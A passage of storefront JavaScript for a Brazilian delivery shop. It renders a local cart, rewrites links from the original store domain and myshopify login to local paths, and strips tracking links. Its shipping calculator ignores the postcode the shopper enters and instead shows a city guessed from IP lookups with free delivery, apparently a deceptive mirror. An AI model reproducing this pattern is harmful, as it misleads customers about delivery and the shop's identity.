    if (!cartPaths.includes(window.location.pathname)) return;

    const main = document.querySelector('#shopify-section-template--22109436444886__main .container');
    if (!main) return;

    try {
      const cart = await fetch('/cart.json', { credentials: 'same-origin' }).then((response) => response.json());
      document.querySelectorAll('cart-count').forEach((count) => {
        count.textContent = String(cart.item_count || 0);
      });

      if (!cart.item_count) {
        main.innerHTML = `
          <div class="empty-state text-container">
            <h1 class="heading h1">Carrinho</h1>
            <p class="text--large">Seu carrinho esta vazio</p>
            <div class="button-wrapper">
              <a href="/cardapio" class="button button--primary">Comece a comprar</a>
            </div>
          </div>
        `;
        return;
      }

      main.innerHTML = `
        <div class="divino-cart">
          <h1 class="heading h1">Carrinho</h1>
          <div class="divino-cart-lines">
            ${(cart.items || []).map(cartLineTemplate).join('')}
          </div>
          <div class="divino-cart-summary">
            <strong>Total</strong>
            <strong>${formatMoney(cart.total_price)}</strong>
          </div>
          ${cart.total_price < minimumOrderCents ? `
            <div class="divino-cart-minimum">
              Pedido minimo de R$ 15,00 para finalizar. Adicione mais itens ao carrinho.
            </div>
          ` : ''}
          <div id="divino-cart-error" class="divino-cart-error" hidden></div>
          <button type="button" id="divino-checkout-button" class="button button--primary" style="margin-top: 12px;" ${cart.total_price < minimumOrderCents ? 'disabled' : ''}>Finalizar pedido</button>
        </div>
      `;

      const checkoutButton = document.getElementById('divino-checkout-button');
      if (checkoutButton) {
        checkoutButton.addEventListener('click', () => startCheckout(checkoutButton));
      }

      document.querySelectorAll('[data-cart-remove]').forEach((button) => {
        button.addEventListener('click', async () => {
          button.disabled = true;
          button.textContent = 'Removendo...';

          try {
            await removeCartItem(button.getAttribute('data-cart-remove'));
            await renderLocalCart();
          } catch (error) {
            const errorBox = document.getElementById('divino-cart-error');
            if (errorBox) {
              errorBox.textContent = error.message || 'Nao foi possivel remover o item.';
              errorBox.hidden = false;
            }
            button.disabled = false;
            button.textContent = 'Remover';
          }
        });
      });
    } catch {
      // Keep the mirrored cart visible if the local cart endpoint is unavailable.
    }
  }

  function updateLocationText(location) {
    const city = document.getElementById('localCidade');
    const state = document.getElementById('localEstado');

    if (city) city.textContent = location.city;
    if (state) state.textContent = location.state;
  }

  async function loadEstimatedLocation() {
    if (estimatedLocationPromise) return estimatedLocationPromise;

    estimatedLocationPromise = (async () => {
      const providers = [
        {
          url: 'https://ipwho.is/?lang=pt-BR',
          parse: (data) => data && data.success !== false && data.city && data.region
            ? { city: data.city, state: data.region }
            : null
        },
        {
          url: 'https://ipapi.co/json/',
          parse: (data) => data && data.city && data.region
            ? { city: data.city, state: data.region }
            : null
        }
      ];

      for (const provider of providers) {
        try {
          const response = await fetch(provider.url, { cache: 'no-store' });
          const location = provider.parse(await response.json());
          if (location) {
            estimatedLocation = location;
            updateLocationText(estimatedLocation);
            return estimatedLocation;
          }
        } catch {}
      }

      updateLocationText(estimatedLocation);
      return estimatedLocation;
    })();

    return estimatedLocationPromise;
  }

  function renderFixedShipping() {
    const result = document.querySelector('.frete-resultado');
    const cepResult = document.querySelector('.cep-resultado');
    const location = estimatedLocation || fallbackLocation;

    updateLocationText(location);

    if (cepResult) {
      cepResult.innerHTML = `<span style="color: var(--frete-buscar-localizacao);"> <i class="fa-solid fa-location-dot"></i> &nbsp</span><span style="font-weight: 600;color:var(--frete-buscar-localizacao);">${location.city} - ${location.state}</span>`;
    }

    if (result) {
      result.style.display = 'block';
      result.innerHTML = `
        <table class="table">
          <thead>
            <tr>
              <th>Entrega</th>
              <th>Prazo</th>
              <th>Valor</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><strong>Motoboy</strong></td>
              <td><i class="fa-solid fa-motorcycle"></i> <b>${deliveryEstimateText.replace(' min', '')}</b> min</td>
              <td><strong style="color: var(--frete-buscar-precos);">Gratis</strong></td>
            </tr>
          </tbody>
        </table>
      `;
    }
  }

  function setupFixedShipping() {
    document.addEventListener('click', (event) => {
      const button = event.target && event.target.closest ? event.target.closest('.buscaCep') : null;
      if (!button) return;

      event.preventDefault();
      event.stopImmediatePropagation();
      renderFixedShipping();
      loadEstimatedLocation().then(renderFixedShipping);
    }, true);

    document.addEventListener('submit', (event) => {
      if (!event.target || !event.target.querySelector || !event.target.querySelector('#campo-cep')) return;

      event.preventDefault();
      event.stopImmediatePropagation();
      renderFixedShipping();
      loadEstimatedLocation().then(renderFixedShipping);
    }, true);
  }

  document.addEventListener('DOMContentLoaded', () => {
    normalizePublicLinks();
    normalizeCartAddForms();
    renderLocalCart();
    setupFixedShipping();
    loadEstimatedLocation();
  });
  document.addEventListener('click', (event) => {
    const button = event.target && event.target.closest ? event.target.closest('button[name="add"], input[name="add"]') : null;
    if (!button || !isCartAddForm(button.form)) return;

    event.preventDefault();
    event.stopImmediatePropagation();
    addToCart(button.form);
  }, true);

  document.addEventListener('submit', async (event) => {
    const form = event.target;
    if (!isCartAddForm(form)) return;

    event.preventDefault();
    event.stopImmediatePropagation();
    addToCart(form);
  }, true);
})();

//# sourceMappingURL=/cdn/shop/t/2/assets/custom.js.map?v=165930397078196874451780917605

// Ajustes da loja local: remove destinos antigos e mantém "Meus pedidos" acessível.
document.addEventListener('DOMContentLoaded', () => {
  document.querySelectorAll('a[href], form[action]').forEach((element) => {
    const attribute = element.matches('form') ? 'action' : 'href';
    const value = element.getAttribute(attribute) || '';

    if (/myshopify\.com\/customer_authentication/i.test(value)) {
      element.setAttribute(attribute, '/meus-pedidos');
      element.setAttribute('aria-label', 'Meus pedidos');
      return;
    }

    if (/^(?:https?:)?\/\/(?:www\.)?hexadivinosdelivery\.site/i.test(value)) {
      try {
        const localUrl = new URL(value, window.location.origin);
        element.setAttribute(attribute, `${localUrl.pathname}${localUrl.search}${localUrl.hash}`);
      } catch {
        element.removeAttribute(attribute);
      }
    }

    if (/utmify/i.test(value)) {
      element.removeAttribute(attribute);
    }
  });

  const desktopMenu = document.querySelector('.header__linklist');
  if (desktopMenu && !desktopMenu.querySelector('a[href="/meus-pedidos"]')) {
    const item = document.createElement('li');
    item.className = 'header__linklist-item';
    item.dataset.itemTitle = 'Meus pedidos';
    item.innerHTML = '<a class="header__linklist-link link--animated" href="/meus-pedidos">Meus pedidos</a>';
    desktopMenu.appendChild(item);
  }

  const mobileMenu = document.querySelector('.mobile-nav');
  if (mobileMenu && !mobileMenu.querySelector('a[href="/meus-pedidos"]')) {
    const item = document.createElement('li');
    item.className = 'mobile-nav__item';
    item.dataset.level = '1';
    item.innerHTML = '<a href="/meus-pedidos" class="mobile-nav__link heading h5">Meus pedidos</a>';
    mobileMenu.appendChild(item);
  }
});
